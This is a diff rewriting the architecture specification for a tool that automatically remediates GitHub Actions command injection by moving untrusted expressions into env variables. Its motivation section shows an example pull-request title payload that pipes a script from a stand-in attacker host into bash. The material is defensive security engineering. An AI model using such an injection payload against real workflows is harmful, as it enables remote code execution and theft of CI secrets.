@@ -1,430 +1,737 @@
-# CST Auto Remediator — Project Secretary
+# CST Auto-Remediator Architecture and Technical Specification (Version 1)
 
-> **Maintainer rule:** Whenever you change core behavior, add fixtures, or extend the
-> pipeline, **update this file in the same change**. This document is the onboarding
-> source of truth for humans and AI tools working on the repo.
-
-**Last updated:** 2026-06-24  
-**Scope implemented:** Stages 1–3 (plain scalar remediation only; block scalars detected but not patched)
+This document serves as the canonical technical specification, compiler reference, and research documentation for the **Concrete Syntax Tree (CST) Auto-Remediator** project. It details the design decisions, system architecture, data flows, security models, verification framework, and roadmap for the project as of **Version 1**.
 
 ---
 
-## What this project does
+## 1. Project Overview
 
-Deterministic, rule-based auto-remediation for a specific class of **command injection**
-in GitHub Actions workflow YAML files.
+### Research Problem
+Continuous Integration and Continuous Deployment (CI/CD) pipelines have become primary targets for supply chain attacks. A particularly severe vulnerability class is **GitHub Actions (GHA) Command Injection**. This occurs when user-controlled, untrusted context data (such as pull request titles, issue comments, branch names, or git commit messages) is evaluated directly inside run scripts without validation or sanitization.
 
-**Vulnerability:** Untrusted data (PR titles, issue bodies, branch names) interpolated
-into `run:` shell commands via `${{ ... }}` is substituted by GitHub as plain text
-*before* the shell parses the command — enabling injection.
+### Motivation: The GitHub Actions Command Injection Threat
+In a typical GitHub Actions workflow, steps run commands in a shell environment:
+```yaml
+- name: Print PR Title
+  run: |
+    echo "Processing PR: ${{ github.event.pull_request.title }}"
+```
+If a malicious user submits a pull request with the title `test" && curl http://attacker.com/malicious.sh | bash #`, GitHub Actions evaluates the expression in-line, expanding the run command to:
+```bash
+echo "Processing PR: test" && curl http://attacker.com/malicious.sh | bash #"
+```
+This leads to arbitrary remote code execution (RCE) on the runner, exposing secrets, codebases, and credentials.
 
-**Fix (when safe):** Move the expression into `env:` and reference `$SAFE_VAR` in `run:`.
-The shell treats env vars as opaque literals.
+### Why CST instead of Regular Expressions?
+Legacy search-and-replace tools or regular expression (Regex) rewriters are inadequate for securing workflows:
+* **Context Blindness**: Regexes cannot distinguish between safe contexts (e.g., single-quoted strings `run: echo '${{ github.event.issue.title }}'` where shells do not evaluate expressions) and unsafe contexts.
+* **Format and Layout Corruption**: Regex rewriters modify white space, strip comments, and corrupt custom YAML indentations.
+* **Position Ignorance**: Regexes cannot track absolute source character offsets, preventing precise and verifiable file patching.
 
-**Design principles:**
+A **Concrete Syntax Tree (CST)** is a typed, lossless, and character-accurate representation of the source code. It retains 100% of formatting details, including comments, spacing, custom quote styles, and line endings (LF/CRLF), while providing full AST-style traversal and semantic analysis.
 
-1. **CST / round-trip parsing** — use `ruamel.yaml` in round-trip mode so formatting,
-   comments, and quote style outside the edit are preserved byte-for-byte.
-2. **Determinism** — no LLM judgment; fixed enums and rule chains only.
-3. **Bailout-first** — refuse to patch ambiguous or unsafe cases; log structured reasons.
-4. **Audit trail** — every expression site gets a report row with offsets, classification,
-   action, and reason.
+### Why Deterministic Remediation?
+The remediation engine is strictly deterministic:
+* It avoids the unpredictable behavior, latency, and cost of Large Language Models (LLMs).
+* It enforces formal compiler transformations: pulling untrusted expression values into step-level environment variables (e.g., `env: ENV_VAR: ${{ ... }}`) and replacing the script expressions with POSIX shell variable references (e.g., `$VAR`).
+* Given a specific input workflow, it generates the exact same byte-for-byte output every time, ensuring compilation is reproducible, auditable, and safe.
+
+### Research Objectives
+1. **Lossless Remediation**: Secure GHA workflows against command injection automatically.
+2. **Format Preservation**: Guarantee that no untouched bytes (including spacing, comments, and empty lines) are modified.
+3. **Formal Verification**: Certify every patch with an external verification framework assessing syntax, semantics, format drift, and security completeness.
 
 ---
 
-## Repository layout
+## 2. Compiler Design Philosophy
 
-```
-CST_Auto_Remidiator/
-├── explanation.md          ← YOU ARE HERE (project secretary — keep updated)
-├── README.md                 ← Short project blurb
-├── pyproject.toml            ← Package metadata, deps (ruamel.yaml>=0.18,<0.19), pytest config
-│
-├── src/cst_auto_remediator/  ← Core library (Stages 1–3)
-│   ├── __init__.py           ← Public API export
-│   ├── models.py             ← Shared types, enums, dataclasses
-│   ├── ingest.py             ← Stage 1: read, validate, parse
-│   ├── classify.py           ← Stage 2: expression scan + taint classification
-│   ├── traverse.py           ← Stage 2: walk jobs/steps/run
-│   ├── validate.py           ← Stage 3: rule chain (sinks, collisions)
-│   ├── mutate.py             ← Stage 3: CST patch + byte-preserving text output
-│   ├── pipeline.py           ← Orchestrator: wires Stages 1→2→3
-│   │
-│   ├── yaml_cst/             ← Stage 2: Immutable Lossless YAML CST Nodes & Builder
-│   │   ├── nodes.py          ← Green CST Node classes (Frozen dataclasses)
-│   │   ├── builder.py        ← CST Builder converting ruamel parsed maps/seqs
-│   │   └── parser.py         ← Stage 1: UTF-8, YamlBomb, size limits and parser
-│   │
-│   ├── gha_semantic/         ← Stage 3: GHA Semantic Layer
-│   │   ├── nodes.py          ← Semantic concepts (Workflow, Job, Step, run, env)
-│   │   ├── scanner.py        ← Decoupled balanced-brace expression scanner
-│   │   └── builder.py        ← Semantic model builder & Diagnostics (GHA001-GHA010)
-│   │
-│   ├── gha_metadata/         ← Stage 4: GHA Metadata Providers
-│   │   ├── nodes.py          ← Metadata models (Position, Scope, Shell, Expression, Bundle)
-│   │   ├── engine.py         ← MetadataWrapper cache engine & MetadataProvider
-│   │   └── providers.py      ← Concrete Position, Scope, Shell, and Expression providers
-│   │
-│   └── gha_analysis/         ← Stage 5: GHA Security Analysis
-│       ├── nodes.py          ← Finding enums and analysis models (Trust, Sink, Decision, Statistics)
-│       ├── classifier.py     ← Taint-source prefixes and environment variable taint propagation
-│       ├── validator.py      ← Supported shells, runners, scalar styles, and quoting checkers
-│       ├── diagnostics.py    ← Compiler warning and error diagnostics (ANA001-ANA005)
-│       └── analyzer.py       ← analyze_workflow() central driver querying Stage 4 metadata
-│
-├── tests/                    ← pytest suite
-│   ├── test_classify.py      ← Unit tests for classification
-│   ├── test_validate.py      ← Unit tests for validation rules
-│   ├── test_ingest.py        ← Stage 1 / line-ending tests
-│   ├── test_fixtures.py      ← Integration tests over fixtures/
-│   ├── test_already_remediated.py ← Already-remediated + testing/ scenarios
-│   ├── test_stage2_comprehensive.py ← Stage 2 Green CST tests
-│   ├── test_stage3_comprehensive.py ← Stage 3 GHA Semantic Layer tests
-│   ├── test_stage4_comprehensive.py ← Stage 4 Metadata Providers tests
-│   ├── test_stage5_comprehensive.py ← Stage 5 Security Analysis tests
-│   └── test_pipeline_integration.py ← End-to-end compiler integration tests
-│
-├── testing/                  ← Complex integration scenarios (see testing/README.md)
-│   ├── inputs/               ← Scenario YAML inputs
-│   ├── expected/             ← Expected report + YAML oracle files
-│   ├── output/               ← Latest run_scenarios.py outputs (for manual review)
-│   └── run_scenarios.py      ← Regenerate testing/output/
-│
-├── fixtures/                 ← Minimal YAML scenarios + expected outputs
-│   ├── *.yml                 ← Input workflows
-│   ├── clean_passthrough2.yml ← Already-remediated workflow (verify_diff2.py)
-│   ├── *.expected.json       ← Expected report entries (incl. start/end offsets)
-│   └── *.expected.yml        ← Expected patched YAML (where applicable)
-│
-├── scripts/
-│   └── regenerate_expected.py  ← Regenerate fixtures/.expected.* after changes
-│
-├── verify_basic.py           ← Manual check: report, offsets, line endings
-├── verify_diff.py            ← Manual diff: vulnerable fixture (expects changes)
-├── verify_diff2.py           ← Manual diff: already-remediated fixture (expects NO diff)
-├── verify_output.yml         ← Ephemeral output from verify_diff.py
-└── verify_output2.yml        ← Ephemeral output from verify_diff2.py
+The architecture of the CST Auto-Remediator is governed by the following core guidelines:
+
+* **Immutable Green CST**: The syntax tree is entirely read-only. Modifying a node returns a new node, leaving original structures untouched. This allows structural sharing and safe multi-pass analysis.
+* **Copy-on-Write (CoW)**: When a subtree changes, only nodes on the path from the mutated node up to the tree root are duplicated. All untouched sibling subtrees are structurally shared by reference, minimizing memory allocation.
+* **Strict Separation of Concerns**: Compiler stages have exactly one responsibility. Structural parsing, semantic modeling, metadata generation, and security analysis are strictly separated. 
+* **Metadata Separation**: AST/Semantic nodes remain pure and syntax-oriented. Metadata facts (such as spans, parent linkages, scope variables, and runner shells) are calculated and cached externally in a `MetadataWrapper` using node object IDs (`id(node)`) as index keys.
+* **Post-Serialization Certification**: To guarantee reliability, the verification framework is completely decoupled from the main compiler stages. It treats the serialized output as untrusted and certifies it via five independent read-only verification passes.
+
+---
+
+## 3. System Overview
+
+### High-Level Compilation Pipeline
+The compiler translates raw workflow files to safe, certified equivalents through the following pipeline:
+
+```mermaid
+graph TD
+    A[Original YAML Bytes] --> B[Ingest & Parse - Stage 1]
+    B --> C[Concrete Syntax Tree - Stage 2]
+    C --> D[Semantic Reconstruction - Stage 3]
+    D --> E[Metadata Separation - Stage 4]
+    E --> F[Security Taint Analysis - Stage 5]
+    F --> G[Mutation Planning - Stage 6]
+    G --> H[CST Transformation & Serialization - Stage 7]
+    H --> I[Verification & Certification - Stage 8]
+    I --> J[Safe Output YAML Bytes]
 ```
 
-## Architecture Flow (Version 1)
+### Future System Architecture Integration
+Once integrated into the production platform, the compiler will serve as the core engine powering automated APIs, Web UIs, and CI integrations:
 
-```
-Parser
-↓
-Green CST
-↓
-Semantic Layer
-↓
-Metadata
-↓
-Transformation
-↓
-Synchronization Layer
-↓
-ruamel Formatting Model
-↓
-Serializer
+```mermaid
+graph LR
+    User[User Workflow Upload] --> API[FastAPI Backend / REST API]
+    API --> Compiler[Stage 1-8 Remediator Engine]
+    Compiler --> Report[Certification Report & Safe YAML]
+    Report --> UI[React Frontend / Google Stitch UI]
+    Report --> GitHubApp[GitHub App / PR Auto-Patch]
 ```
 
 ---
 
-## Pipeline overview (Stages 1–3)
+## 4. Compiler Architecture (Detailed Stage Breakdown)
+
+### Stage 1: Ingest & Parse
+* **Purpose**: Safe raw ingestion, UTF-8 decoding, and validation of raw workflow bytes into structured, editable collections.
+* **Consumes**: Raw file `bytes`.
+* **Produces**: `IngestSuccess` (containing a `ruamel.yaml` CommentedMap/Seq, `FileMetadata`, and raw source string) or `IngestFailure` models.
+* **Allowed Dependencies**: `pathlib`, `hashlib`, `ruamel.yaml`, `cst_auto_remediator.models`.
+* **Forbidden Responsibilities**: Must NOT assess GHA syntax, inspect security, check shells, or perform transformations.
+* **Invariants**: 
+  * Strict file size limit (Maximum 2 MB).
+  * Defensive recursion limits to reject recursive alias-loops (YAML bombs, maximum 10 aliases).
+  * Byte-level line-ending detection (dominant LF vs CRLF).
+* **Major Classes**: `FileMetadata`, `IngestSuccess`, `IngestFailure`.
+* **Major Files**: [ingest.py](file:///c:/CST/src/cst_auto_remediator/ingest.py), [parser.py](file:///c:/CST/src/cst_auto_remediator/yaml_cst/parser.py).
+
+### Stage 2: Concrete Syntax Tree (CST)
+* **Purpose**: Reconstruct the lossless, layout-preserving syntax tree from `ruamel.yaml` structures.
+* **Consumes**: Parsed `ruamel.yaml` trees and Stage 1 `FileMetadata`.
+* **Produces**: A typed, immutable `YamlDocument` CST.
+* **Allowed Dependencies**: `uuid`, `dataclasses`, `yaml_cst.nodes`.
+* **Forbidden Responsibilities**: Must NOT extract GHA workflow-specific variables, validate security, or evaluate command taints.
+* **Invariants**: All nodes (`YamlNode`) must be completely frozen (`frozen=True` dataclasses) and implement value-based structural equality checks (`structurally_equal`).
+* **Responsibilities**: Translate maps, sequences, and scalars into immutable CST classes, preserving line/column coordinates.
+* **Major Classes**: `YamlNode`, `YamlDocument`, `YamlMapping`, `YamlSequence`, `YamlKeyValue`, `YamlScalar`, `SourceSpan`.
+* **Major Files**: [nodes.py](file:///c:/CST/src/cst_auto_remediator/yaml_cst/nodes.py), [builder.py](file:///c:/CST/src/cst_auto_remediator/yaml_cst/builder.py).
+
+### Stage 3: Semantic Reconstruction
+* **Purpose**: Parse raw CST structures into a domain-specific GitHub Actions semantic model.
+* **Consumes**: `YamlDocument` CST.
+* **Produces**: `SemanticBuildResult` containing the structured `Workflow` model and `Diagnostic` warning/error entries.
+* **Allowed Dependencies**: `gha_semantic.nodes`, `gha_semantic.scanner`, `yaml_cst.nodes`.
+* **Forbidden Responsibilities**: Must NOT resolve shell capabilities, perform data-flow taint analysis, or execute node transformations.
+* **Invariants**: Expression scanning must utilize balanced brace matching with brace-nesting awareness.
+* **Responsibilities**: Map CST nodes to `Job`, `Step`, `RunCommand`, and `EnvBinding` nodes. Run schema validations (`GHA001`-`GHA010`).
+  * **GHA001**: Workflow root must be a mapping.
+  * **GHA002**: Missing 'jobs' section in workflow.
+  * **GHA003**: Jobs section must be a mapping.
+  * **GHA004**: Job '{job_id}' must be a mapping.
+  * **GHA005**: Steps in job '{job_id}' must be a sequence.
+  * **GHA006**: Step at index {step_idx} in job '{job_id}' must be a mapping.
+  * **GHA007**: Id in step {step_idx} of job '{job_id}' must be a scalar.
+  * **GHA008**: Run command in step {step_idx} of job '{job_id}' must be a scalar.
+  * **GHA009**: Env block in step {step_idx} of job '{job_id}' must be a mapping.
+  * **GHA010**: Env binding in step {step_idx} of job '{job_id}' must have a scalar key and value.
+* **Major Classes**: `Workflow`, `Job`, `Step`, `RunCommand`, `EnvBinding`, `ExpressionSite`, `Diagnostic`.
+* **Major Files**: [nodes.py](file:///c:/CST/src/cst_auto_remediator/gha_semantic/nodes.py), [scanner.py](file:///c:/CST/src/cst_auto_remediator/gha_semantic/scanner.py), [builder.py](file:///c:/CST/src/cst_auto_remediator/gha_semantic/builder.py).
+
+### Stage 4: Metadata Separation
+* **Purpose**: Accumulate positions, environment scopes, and runner shell properties without dirtying AST/Semantic nodes.
+* **Consumes**: `Workflow` semantic hierarchy.
+* **Produces**: `MetadataWrapper` instance containing cached, resolved metadata providers.
+* **Allowed Dependencies**: `gha_metadata.nodes`, `gha_metadata.providers`, `gha_semantic.nodes`.
+* **Forbidden Responsibilities**: Must NOT classify security taints (e.g. no "safe/untrusted" labeling) or perform script alterations.
+* **Invariants**: Total separation of concerns; metadata objects are mapped to semantic node Python object IDs (`id(node)`) inside the central lookup registry.
+* **Responsibilities**: Determine scope-inherited environment tables, evaluate job-level runs-on attributes to determine runner defaults, determine step-declared shells and shell capabilities, and resolve expression stable paths.
+* **Major Classes**: `MetadataWrapper`, `MetadataProvider`, `PositionProvider`, `ScopeProvider`, `ShellProvider`, `ExpressionProvider`.
+* **Major Files**: [engine.py](file:///c:/CST/src/cst_auto_remediator/gha_metadata/engine.py), [nodes.py](file:///c:/CST/src/cst_auto_remediator/gha_metadata/nodes.py), [providers.py](file:///c:/CST/src/cst_auto_remediator/gha_metadata/providers.py).
+
+### Stage 5: Security Analysis
+* **Purpose**: Implement expression risk classification, sink checking, and runner validation rules.
+* **Consumes**: `Workflow` model and Stage 4 `MetadataWrapper`.
+* **Produces**: `SecurityAnalysisResult` containing classifications and compiler security warnings.
+* **Allowed Dependencies**: `gha_analysis.nodes`, `gha_analysis.classifier`, `gha_analysis.validator`, `gha_analysis.diagnostics`.
+* **Forbidden Responsibilities**: Must NOT generate variable names, plan mutations, or modify the CST.
+* **Invariants**: Analysis decisions must be deterministic. Environment variable taint propagation must recursively resolve nested expressions.
+* **Responsibilities**: Analyze context paths (e.g., `github.event.issue.title` as `UNTRUSTED`), check shell/runner support, detect shell quoting states, and check script command sinks (`eval`, command substitution).
+  * **ANA001**: Unknown expression source context (Warning).
+  * **ANA002**: Unsupported step shell environment (Error).
+  * **ANA003**: Unsupported block scalar format (Warning).
+  * **ANA004**: Unsafe expression reaches shell command execution sink (Error).
+  * **ANA005**: Safe expression (Warning/Info).
+* **Major Classes**: `SecurityAnalysisResult`, `ExpressionClassification`, `AnalysisStatistics`.
+* **Major Files**: [analyzer.py](file:///c:/CST/src/cst_auto_remediator/gha_analysis/analyzer.py), [classifier.py](file:///c:/CST/src/cst_auto_remediator/gha_analysis/classifier.py), [validator.py](file:///c:/CST/src/cst_auto_remediator/gha_analysis/validator.py), [nodes.py](file:///c:/CST/src/cst_auto_remediator/gha_analysis/nodes.py), [diagnostics.py](file:///c:/CST/src/cst_auto_remediator/gha_analysis/diagnostics.py).
+
+### Stage 6: Mutation Planning
+* **Purpose**: Build a plan of mutations for vulnerable steps.
+* **Consumes**: `SecurityAnalysisResult` and Stage 4 `MetadataWrapper`.
+* **Produces**: `MutationPlan`.
+* **Allowed Dependencies**: `gha_transform.nodes`, `gha_transform.namer`.
+* **Forbidden Responsibilities**: Must NOT execute changes on CST nodes or serialize code.
+* **Invariants**: POSIX-compliant variable names must be collision-free across workflow, job, and step scopes. If an expression is already bound to an env variable in the step scope, reuse it.
+* **Responsibilities**: Generate unique uppercase SCREAMING_SNAKE env variable names, append suffix hashes when naming collisions occur, and map replacement string slices.
+* **Major Classes**: `MutationPlanner`, `MutationPlan`, `StepMutation`, `SiteReplacement`, `EnvVarEntry`.
+* **Major Files**: [planner.py](file:///c:/CST/src/cst_auto_remediator/gha_transform/planner.py), [namer.py](file:///c:/CST/src/cst_auto_remediator/gha_transform/namer.py), [nodes.py](file:///c:/CST/src/cst_auto_remediator/gha_transform/nodes.py).
+
+### Stage 7: Format-Preserving Transformation
+* **Purpose**: Apply planned changes to the Green CST using Copy-on-Write techniques and generate the final output bytes.
+* **Consumes**: `MutationPlan`, original `ruamel.yaml` root, and original CST `YamlDocument`.
+* **Produces**: Mutated CST `YamlDocument`, serialized YAML `bytes`, and `TransformationResult`.
+* **Allowed Dependencies**: `gha_transform.transformer`, `gha_transform.serializer`, `gha_transform.rtl`, `yaml_cst.nodes`.
+* **Forbidden Responsibilities**: Must NOT recalculate security taint, run validation checks, or touch the file system.
+* **Invariants**: Unchanged sibling subtrees must retain python object identity (Structural Sharing). Spacing, layout, and line endings must be preserved.
+* **Responsibilities**: Rebuild step mapping nodes to inject `env` keys and update script values, perform right-to-left (RTL) run replacements to prevent offset drifting, synchronize CST mutations back to a `ruamel.yaml` copy, restore blank lines, and output UTF-8 bytes.
+* **Major Classes**: `CSTTransformer`, `SerializationContext`, `TransformationResult`.
+* **Major Files**: [transformer.py](file:///c:/CST/src/cst_auto_remediator/gha_transform/transformer.py), [serializer.py](file:///c:/CST/src/cst_auto_remediator/gha_transform/serializer.py), [rtl.py](file:///c:/CST/src/cst_auto_remediator/gha_transform/rtl.py).
+
+### Stage 8: Verification & Certification
+* **Purpose**: Inspect the generated output bytes and verify compliance with compiler invariants and security contracts.
+* **Consumes**: `VerificationContext` (original and output strings, CSTs, and semantic models).
+* **Produces**: `VerificationReport` containing certification findings and statistics.
+* **Allowed Dependencies**: `gha_verify.verify`, `gha_verify.report`, `gha_verify.passes.*`.
+* **Forbidden Responsibilities**: Must NOT modify the YAML output, write files, or interact with compiler mutation stages. It is strictly read-only.
+* **Invariants**: Verification must be treated as an independent certification layer outside the compiler pipeline.
+* **Responsibilities**: Run five verification passes (Syntax, Semantic, Format, Security, Invariant), flag diagnostic codes (`VER001`-`VER012`), and evaluate invariants (`INV-IDEM`, `INV-DET`, etc.).
+* **Major Classes**: `SyntaxPass`, `SemanticPass`, `FormatPass`, `SecurityPass`, `InvariantPass`, `VerificationReport`, `VerificationContext`, `VerificationFinding`, `InvariantResult`.
+* **Major Files**: [verify.py](file:///c:/CST/src/cst_auto_remediator/gha_verify/verify.py), [report.py](file:///c:/CST/src/cst_auto_remediator/gha_verify/report.py), [passes/](file:///c:/CST/src/cst_auto_remediator/gha_verify/passes).
+
+---
+
+## 5. Compiler Principles
+
+The correctness of the CST Auto-Remediator relies on eight core compiler design principles:
+
+| Principle | Description | Justification |
+| :--- | :--- | :--- |
+| **Immutable Green CST** | All syntax nodes are read-only. Modifications return new instances. | Prevents side-effects during multi-pass analyses and enables clean backtracking. |
+| **Copy-on-Write (CoW)** | Mutating a node duplicates its ancestors up to the root, leaving others unchanged. | Optimizes memory usage by minimizing copying to modified paths. |
+| **Structural Sharing** | Untouched subtrees are shared by reference between original and mutated trees. | Drastically reduces allocation costs and preserves node references. |
+| **Metadata Separation** | Spans, scopes, and shells are cached in a wrapper indexed by node object ID (`id(node)`). | Keeps AST and semantic node classes pure, syntax-focused, and free of analysis state. |
+| **Semantic Reconstruction** | Walks the raw CST to build a model representing GHA steps and runs. | Decouples structural syntax details from domain-specific GitHub Actions workflow logic. |
+| **Deterministic Analysis** | Replaces statistical/LLM heuristics with exact, scope-based semantic rules. | Ensures builds are reproducible, predictable, and verifiable in safety-critical pipelines. |
+| **Format Preservation** | Detects spacing, restores blank lines, and preserves quote styles. | Ensures diff output contains only security changes, with no formatting drift. |
+| **Verification Framework** | Re-parses and checks the output document through an external test harness. | Certifies compilation correctness and protects against silent compiler regressions. |
+
+---
+
+## 6. Compiler Guarantees (Version 1)
+
+The Version 1 compiler guarantees the following behaviors to downstream systems:
+
+* **Deterministic Output**: For any given input, the compiler will generate the exact same byte-for-byte output, regardless of execution environment.
+* **Immutable CST**: CST structures are guaranteed to remain side-effect free.
+* **No Regex Rewriting**: Every syntax check and modification utilizes structured tree operations, guaranteeing that context boundaries are respected.
+* **No Raw YAML Patching**: Layout is updated through formal serialization synchronization rather than unstructured string inserts.
+* **Formatting Preservation**: Indentation, comments, and empty lines are preserved exactly across all unmodified steps.
+* **Idempotent Remediation**: Running the remediator on a previously remediated workflow will yield a byte-identical output, preventing redundant modifications.
+* **Structural Verification**: Re-parsing is verified to prevent syntax errors.
+* **Semantic Verification**: Guarantees that global, job, and step settings remain isomorphic (unchanged).
+* **Security Verification**: Confirms that no untrusted expressions remain in the run commands of patched steps and that no prior bailout rules were silently bypassed.
+
+---
+
+## 7. Repository Structure and Dependency Flow
+
+### Repository Organization
 
 ```
-remediate_file(path)
-    │
-    ├─ Stage 1: ingest.py
-    │     read bytes → SHA-256, UTF-8 check, 2 MB cap, detect line_ending
-    │     parse with ruamel (maxAliasCount=10) → CommentedMap CST
-    │     on failure → BAILED report (no offsets)
-    │
-    ├─ Stage 2: traverse.py + classify.py
-    │     walk jobs.<id>.steps[].run only
-    │     find ${{ ... }} spans → ExpressionSite list
-    │     classify: UNTRUSTED | TRUSTED | AMBIGUOUS
-    │     detect scalar_type: plain | block
-    │
-    └─ Stage 3: validate.py + mutate.py + pipeline.py
-          per site: validate_site() → PATCHED | SKIPPED | BAILED
-          if any PATCHED: apply_patches(CST) + build_patched_text(source_text)
-          assert_byte_preservation() on unchanged lines
-          return (yaml_string, report[])
+CST/
+├── src/                          # Source directory
+│   └── cst_auto_remediator/      # Core package root
+│       ├── yaml_cst/             # [Core] Stage 1 & 2: parser, builder, and nodes
+│       ├── gha_semantic/         # [Core] Stage 3: semantic model nodes, builder, and scanner
+│       ├── gha_metadata/         # [Core] Stage 4: metadata engine and position/scope/shell providers
+│       ├── gha_analysis/         # [Core] Stage 5: security analyzer, classifiers, and validators
+│       ├── gha_transform/        # [Core] Stage 6 & 7: planners, transformers, and serializers
+│       ├── gha_verify/           # [Core] Stage 8: verification orchestrator and passes
+│       ├── models.py             # [Core] Shared compiler data types and ReasonCodes
+│       ├── pipeline.py           # [Core] Main pipeline orchestrator
+│       ├── ingest.py             # [Core] Stage 1 entry point
+│       ├── traverse.py           # [Support] Legacy traversal logic (Deprecated)
+│       ├── classify.py           # [Support] Legacy classification helper (Deprecated)
+│       └── validate.py           # [Support] Legacy validation checks (Deprecated)
+├── tests/                        # [Support] Comprehensive automated test suite
+├── testing/                      # [Support] Complex integration test cases and scripts
+├── scripts/                      # [Support] Maintenance and code regeneration scripts
+├── fixtures/                     # [Support] Static test workflow files (.yml) and expected schemas
+├── pyproject.toml                # Project metadata and dependency configuration
+└── explanation.md                # Project architectural specification
+```
+
+### Package Dependency Flow
+
+To maintain strict modularity, compiler packages are organized in a unidirectional dependency graph. No reverse dependencies or circular imports are permitted:
+
+```mermaid
+graph TD
+    yaml_cst --> gha_semantic
+    gha_semantic --> gha_metadata
+    gha_metadata --> gha_analysis
+    gha_analysis --> gha_transform
+    gha_transform --> gha_verify
+```
+
+Each package is restricted to importing only from packages positioned above it in the graph. This guarantees that compilation concerns remain isolated.
+
+---
+
+## 8. Data Flow Model
+
+The compiler processes data by transitioning through the following Python objects:
+
+```
+  [Bytes] Raw YAML input bytes
+     |
+     v (Stage 1: ingest.py / parser.py)
+  [ParsedDocument] ruamel.yaml CommentedMap / CommentedSeq
+     |
+     v (Stage 2: builder.py)
+  [YamlDocument] Lossless CST representation
+     |
+     v (Stage 3: gha_semantic/builder.py)
+  [Workflow] Domain semantic model
+     |
+     v (Stage 4: gha_metadata/engine.py)
+  [MetadataWrapper] Position, scope, shell, and duplicate provider cache
+     |
+     v (Stage 5: gha_analysis/analyzer.py)
+  [SecurityAnalysisResult] Taint classifications, decisions, and diagnostics
+     |
+     v (Stage 6: gha_transform/planner.py)
+  [MutationPlan] Naming calculations, env entries, and replacement offsets
+     |
+     v (Stage 7: gha_transform/transformer.py)
+  [TransformationResult] Mutated YamlDocument (generated via Copy-on-Write)
+     |
+     v (Stage 7: gha_transform/serializer.py)
+  [Bytes] Formatted, comment-preserved output YAML bytes
+     |
+     v (Stage 8: gha_verify/verify.py)
+  [VerificationReport] Pass/Fail decision, findings list, and invariant results
 ```
 
 ---
 
-## Core source files (detailed)
+## 9. Detailed Execution Walkthrough
 
-### `src/cst_auto_remediator/__init__.py`
+To understand the coordination of the stages, trace a workflow containing a single job, a single step, and one vulnerable run command:
 
-**Role:** Package entry point.  
-**Exports:** `remediate_file` — the only public API for this session.  
-**Usage:** `from cst_auto_remediator import remediate_file`
+### 1. Ingestion
+The user passes the following workflow bytes to `remediate_file(path)`:
+```yaml
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "User message: ${{ github.event.issue.body }}"
+```
+Stage 1 (`ingest`) validates that the file is under 2 MB, computes the SHA-256 hash, detects the `\n` line ending, and parses the text into a `CommentedMap` using `ruamel.yaml`.
 
----
+### 2. Concrete Syntax Tree Build
+Stage 2 (`build_cst`) maps the `CommentedMap` into a lossless `YamlDocument` object. The `run` scalar is represented as a `YamlScalar` node with a `SourceSpan` recording line index `5`.
 
-### `src/cst_auto_remediator/models.py`
+### 3. Semantic Reconstruction
+Stage 3 (`build_semantic_model`) parses the CST. It identifies the `build` job and its first step. The step's `run` scalar is parsed by the balanced brace expression scanner, extracting an `ExpressionSite` object with `expression_text` set to `"${{ github.event.issue.body }}"` and `start_offset=21`.
 
-**Role:** Single source of truth for data shapes and fixed reason codes.
+### 4. Metadata Mapping
+Stage 4 (`MetadataWrapper`) resolves structural metadata:
+* `PositionProvider`: Maps path segments `("jobs", "build", "steps", "0", "run")`.
+* `ScopeProvider`: Identifies that the step environment scope is empty.
+* `ShellProvider`: Resolves the default shell as `bash` (inherited from the `ubuntu-latest` runner).
+* `ExpressionProvider`: Registers the expression ID as `jobs.build.steps.0.run.exprs.0`.
 
-| Type | Purpose |
-|------|---------|
-| `ReasonCode` | Fixed enum for all bail/skip reasons (Stage 1 + Stage 3) |
-| `Classification` | `UNTRUSTED`, `TRUSTED`, `AMBIGUOUS` |
-| `ScalarType` | `plain` or `block` (`\|` / `>` scalars) |
-| `Action` | `PATCHED`, `SKIPPED`, `BAILED` |
-| `FileMetadata` | `path`, `size`, `sha256`, `encoding`, **`line_ending`** |
-| `ExpressionSite` | One `${{ ... }}` occurrence with **start_offset/end_offset** relative to `run_value` |
-| `IngestSuccess` / `IngestFailure` | Stage 1 result; success carries `source_text` (bytes-accurate) |
-| `ReportEntry` | One JSON report row; `to_dict()` includes offsets for expression sites |
-| `ValidationResult` | Output of `validate_site()` for one site |
-| `PlannedPatch` | Approved mutation: site + generated env var name |
+### 5. Security Analysis
+Stage 5 (`analyze_workflow`) runs the security check:
+* It parses the expression path `github.event.issue.body`.
+* It detects the `github.event.` prefix and classifies it as `UNTRUSTED` (tainted).
+* It checks the shell capabilities for `bash` (which allows environment variable assignments and references).
+* Since the expression is unquoted and untrusted, it classifies the site as `AnalysisDecision.REMEDIATE` and issues security warning `ANA004`.
 
-**Report fields (expression sites):**  
-`file`, `job_id`, `step`, `step_id`, `action`, `reason`, `env_var_added`,
-`expression_text`, `classification`, `scalar_type`, **`start_offset`**, **`end_offset`**
+### 6. Mutation Planning
+Stage 6 (`MutationPlanner`) checks the analysis results:
+* It generates a safe, POSIX-compliant environment variable name for the expression: `GITHUB_EVENT_ISSUE_BODY`.
+* It creates a `StepMutation` containing:
+  * An `EnvVarEntry` mapping `GITHUB_EVENT_ISSUE_BODY` to the expression text.
+  * A `SiteReplacement` substituting characters at offsets `21:52` with `$GITHUB_EVENT_ISSUE_BODY`.
 
-**Report fields (Stage 1 file bail):** only `file`, `action=BAILED`, `reason` — no offsets.
+### 7. Transformation and Serialization
+Stage 7 (`CSTTransformer`) modifies the step node using CoW:
+* It constructs a new `run` `YamlScalar` with the value `echo "User message: $GITHUB_EVENT_ISSUE_BODY"`.
+* It inserts a new `env` `YamlKeyValue` block mapping `GITHUB_EVENT_ISSUE_BODY` to `"${{ github.event.issue.body }}"`.
+* It recreates the step mapping, the jobs sequence, and the root document, while sharing unchanged siblings.
+* `serialize_document` deep-copies the original `ruamel` root, synchronizes the modified nodes, detects layout indents, restores blank lines, and outputs the final bytes:
+```yaml
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          GITHUB_EVENT_ISSUE_BODY: ${{ github.event.issue.body }}
+        run: echo "User message: $GITHUB_EVENT_ISSUE_BODY"
+```
 
----
-
-### `src/cst_auto_remediator/ingest.py` — Stage 1
-
-**Role:** Ingestion + parser. No remediation logic here.
-
-**Functions:**
-
-| Function | Description |
-|----------|-------------|
-| `detect_line_ending(raw_bytes)` | `\r\n` if present in bytes, else `\n` |
-| `read_source_text(raw_bytes)` | UTF-8 decode **without** normalizing newlines |
-| `ingest(path)` | Full Stage 1; returns `IngestSuccess` or `IngestFailure` |
-| `create_yaml_dumper()` | Configured ruamel instance for round-trip dump checks |
